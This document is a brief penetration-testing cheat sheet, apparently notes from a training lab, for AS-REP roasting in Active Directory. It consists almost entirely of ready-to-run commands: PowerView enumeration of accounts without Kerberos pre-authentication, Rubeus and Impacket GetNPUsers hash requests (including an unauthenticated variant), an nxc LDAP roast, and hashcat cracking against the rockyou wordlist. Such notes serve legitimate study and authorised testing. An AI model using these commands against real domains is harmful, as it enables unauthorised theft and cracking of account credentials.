


## From Windows

### Enumeration

```
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```


```
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
```



## From Linux

### Authenticated

```
GetNPUsers.py inlanefreight.local/username:'password' -request
```

### No authentication

```
GetNPUsers.py INLANEFREIGHT/ -dc-ip 172.16.8.3 -usersfile users.txt -format hashcat -outputfile hash.txt
```


```
nxc ldap 10.129.205.35 -u '' -p '' --asreproast asrep.txt
```


## Cracking

```
hashcat.exe -m 18200 hashes.txt rockyou.txt -O
```